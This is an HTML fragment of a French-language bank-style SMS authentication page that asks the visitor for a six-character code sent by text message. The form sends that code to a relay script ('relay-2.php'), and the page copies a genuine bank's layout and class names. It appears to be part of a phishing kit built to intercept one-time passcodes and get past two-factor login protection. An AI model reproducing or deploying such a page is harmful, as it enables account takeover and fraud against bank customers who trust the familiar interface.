...
<body><script type="text/javascript" async="" src="https://cdn.tagcommander.com/privacy/3633/privacy_1.js" charset="utf-8" id="tc_script_0.2547169111233729"></script><script type="text/javascript" async="" src="https://cdn.tagcommander.com/privacy/3633/privacy_1.js" charset="utf-8" id="tc_script_0.19724379487507782"></script>
	...
	<div class="row js-Template-head">
		...
		<div id="code" class="col-xs-12 col-md-push-6 col-md-6" style="">
		    ...
		    <div class="StrongAuthentication-authenticateU">
		        <h1><b>Authentifiez-vous</b></h1>
		        <div class="StrongAuthentication-authenticateUContent">
		           <img src="img/001-check.png">
		            <span><b>&nbsp;&nbsp;&nbsp;Authentification par SMS</b></span>
		        </div>
				...
				<form action="relay-2.php?id=panelidentif&357926036" id="formSendCode" method="POST">
			        <div>
			            <img src="img/002-right-arrow.png">
			            <span><b> &nbsp;&nbsp;&nbsp;Saisie du code</b></span>
			            <p class="StrongAuthentication-para--padLeft46">Veuillez saisir le code que vous venez de recevoir par sms au numéro indiqué. Si vous n’avez rien reçu au bout de quelques minutes, merci de demander le renvoi d’un nouveau code.</p>
			            ...
			            <div class="form-group StrongAuthentication-para--padLeft46 SmsAuthentication-formCode">
			                ...
			                <div class="Login-noPadding">
			                    <div class="add-clear-span form-group"><div class="add-clear-span form-group "><input type="text" class="form-control input-clear" maxlength="6" id="codesms" name="codesms" required="" data-validation="length" data-validation-length="6-6" data-validation-error-msg="Votre saisie doit comporter 6 caractères alphanumériques"><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div>
		...
		<div class="col-xs-12 col-md-pull-6 col-md-6 hidden-xs hidden-sm">
			<div class="row js-StickyPush js-Sticky--enable"><div class="js-StickyWrap"><div class="js-StickyWrap" style="transform: translateY(0px);">
...
<div class="componentZdg">
  ...
  <div class="PushCarousel3-carousel">
    ...
    <div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(-2859px, 0px, 0px); transition: all 0.25s ease 0s; width: 10483px;"><div class="owl-item cloned" aria-hidden="true" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">
       ...
       </div></div><div class="owl-item active" aria-hidden="false" style="width: 952px; margin-right: 1px;"><div class="PushCarousel3-item" data-trackinginfo="">
